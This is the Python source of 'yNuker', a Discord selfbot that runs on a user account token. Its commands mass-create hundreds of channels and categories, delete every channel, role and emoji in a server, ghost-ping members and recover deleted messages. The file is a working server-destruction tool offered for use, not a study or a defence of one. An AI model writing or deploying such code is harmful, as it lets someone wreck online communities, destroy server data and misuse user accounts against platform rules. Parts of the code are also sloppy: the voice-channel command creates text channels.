"""MIT License

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE."""


import discord
from discord.embeds import Embed
from discord.ext import commands
from os import name as os_name, system
from colorama import init, Fore
from discord.ext.commands import CommandNotFound
import requests
import os 
import json
import sys
import time
import random
import asyncio

TITLE = "yNuker"
VERSION = "0.1"


config = json.load(open("config.json", "r"))
clear = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')


clear()
loading = f'''
{Fore.LIGHTCYAN_EX}
                                   ██╗      █████╗  █████  ██████╗ ██╗███╗  ██╗░██████╗
                                   ██║     ██╔══██╗██╔══██╗██╔══██╗██║████╗ ██║██╔════╝
                                   ██║     ██║  ██║███████║██║  ██║██║██╔██╗██║██║   ██╗
                                   ██║     ██║  ██║██╔══██║██║  ██║██║██║╚████║██   ╚██╗
                                   ███████╗╚█████╔╝██║  ██║██████╔╝██║██║ ╚███║╚██████╔╝██╗██╗██╗
                                   ╚══════╝ ╚════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚══╝ ╚═════╝ ╚═╝╚═╝╚═╝
'''


def banner():
    sys.stdout.buffer.write(f'''\
{Fore.LIGHTRED_EX}
                                ██╗   ██╗███╗  ██╗██╗   ██╗██╗  ██╗███████╗██████╗
                                ╚██╗ ██╔╝████╗ ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗   Version: {VERSION}
                                 ╚████╔╝ ██╔██╗██║██║   ██║█████═╝ █████╗  ██████╔╝      Made by: YeetDisDude#0001
                                  ╚██╔╝  ██║╚████║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
                                   ██║   ██║ ╚███║╚██████╔╝██║ ╚██╗███████╗██║  ██║
                                   ╚═╝   ╚═╝  ╚══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     
'''.encode('utf8'))

def cmds():
    sys.stdout.buffer.write(f'''\
{Fore.LIGHTRED_EX}
                                                                                    {Fore.LIGHTRED_EX}Commands
                                       {prefix}kickAll  |   {prefix}delAll  | {prefix}createCh
                                      {prefix}nameAll   |  {prefix}everyone | {prefix}createVc
                                        
                                   ==================Others=================
                                   
                                       {prefix}ping     |   {prefix}snipe   | {prefix}ghostping
                                       
'''.encode('utf8'))

#json shit
token = config["token"] 
prefix = config["prefix"]
everyoneMsg = config["everyoneMsg"]
chName = config["chName"]
roleName = config["roleName"]
vcName = config["vcName"]
ghostpingmsg = config["ghostpingmsg"]
nick = config["nickname"]
catName = config["catName"]

selected_server = None

clear()
print(loading)


client = commands.Bot(command_prefix=prefix, case_insensitive=True, self_bot=True)

@client.event
async def on_ready():
    print("                                                      Finished loading.")
    time.sleep(1)
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="absolutely nothing"))
    clear()
    banner()
    print(f'                                                {Fore.RED}yNuker ready.')
    print(f'                                 {Fore.LIGHTRED_EX}Hello, {Fore.LIGHTWHITE_EX}{client.user.name}#{client.user.discriminator}! {Fore.LIGHTRED_EX}| {Fore.LIGHTWHITE_EX}{client.user.id}')
    print(f'                                        {Fore.LIGHTRED_EX}You are curently in {Fore.RED}{len(client.guilds)} {Fore.LIGHTRED_EX}servers.')
    print(f'''
                
                                                {Fore.LIGHTRED_EX}Commands
                                       {prefix}createAll  |   {prefix}delAll  |  {prefix}createCat
                                      {prefix}createRole  |  {prefix}createVc |
                                        
                                   ==================Others=================
                                   
                                       {prefix}ping     |   {prefix}snipe   | {prefix}ghostping
                                       {prefix}bitcoin  |   {prefix}
                                       {Fore.WHITE}
                                   ''')                                
cmds = ''

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, CommandNotFound):
        return
    raise error


colors = ['0x32a852', '0x4ac7b8', '0x4a69c7', '0x804ac7', '0xc14ac7', '0xc74a63', '0x8dc74a', '0xc7b64a', '0xd43737'] #nothing


@client.command()
async def createCh(ctx):
    await ctx.message.delete()
    for i in range(400):
        guild = ctx.guild
        print(f"Creating channels. {chName}")
        await ctx.guild.create_text_channel(f"{chName}")

@client.command()
async def createCat(ctx):
    await ctx.message.delete()
    for i in range(400):
        guild = ctx.guild
        print(f"- Creating categories. {catName}")
        await ctx.guild.create_category(f"{catName}")
        print("Success.")

@client.command()
async def createVc(ctx):
    await ctx.message.delete()
    for i in range(400):
        guild = ctx.guild
        print(f"- Creating voice channels. {vcName}")
        await ctx.guild.create_text_channel(f"{vcName}")
        print("Success.")

@client.command()
async def createAll(ctx):
    await ctx.message.delete()
    for i in range(100):
        guild = ctx.guild
        print("Creating voice channels, text channels, and categories.")
        await ctx.guild.create_text_channel(f"{vcName}")
        await ctx.guild.create_text_channel(f"{vcName}")
        await ctx.guild.create_category(f"{catName}")
        print("Success.")


@client.command()
async def delAll(ctx):
    await ctx.message.delete()
    print(' Deleting everything...')
    
    print('- Deleting channels..')
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except discord.HTTPException:
            print(f"I wasen't able to delete the channel {channel.name} in the server {ctx.guild.name}")    
    print('- Deleting roles..')
    for role in ctx.guild.roles:

        if str(role) == '@everyone':
            continue

        try:
            await role.delete()
        except discord.Forbidden:
            print(f"[{ctx.guild.name}] - I'm not able to delete the role {role.name} in")
    print('- Deleting emojis..')
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
        except discord.Forbidden:
            print(f"[{ctx.guild.name}] - I am not able to delete the role {emoji.name}.")
    print("I have deleted everything.")

#======================================================others section=================================

@client.command(name="ping")
async def ping(ctx):
    embed=discord.Embed(
         title="Pong!",
         description=(f"{round(client.latency * 1000)}ms."),
         color=0x09c809)
    await ctx.send(embed=embed)

#snipe command
client.sniped_messages = {}



@client.event
async def on_message_delete(message):
    client.sniped_messages[message.guild.id] = (message.content, message.author, message.channel.name, message.created_at)

@client.command()
async def snipe(ctx):
    try:
        contents, author, channel_name, time = client.sniped_messages[ctx.guild.id]
        
    except:
        await ctx.channel.send("I couldn't find a message to snipe.")
        return

    embed = discord.Embed(description=contents, color=discord.Color.purple(), timestamp=time)
    embed.set_author(name=f"{author.name}#{author.discriminator}", icon_url=author.avatar_url)
    embed.set_footer(text=f"Deleted in : #{channel_name}")

    await ctx.channel.send(embed=embed)
#snipe command

@client.command()
async def ghostping(ctx):
    await ctx.message.delete()
    await ctx.send(f'{ghostpingmsg}', delete_after=0)

@client.command(aliases=['bitcoin'])
async def btc(ctx):
    r = requests.get(
        'https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(
        name='Bitcoin',
        icon_url=
        'https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png'
    )
    await ctx.send(embed=em)


client.run(token, bot=False)
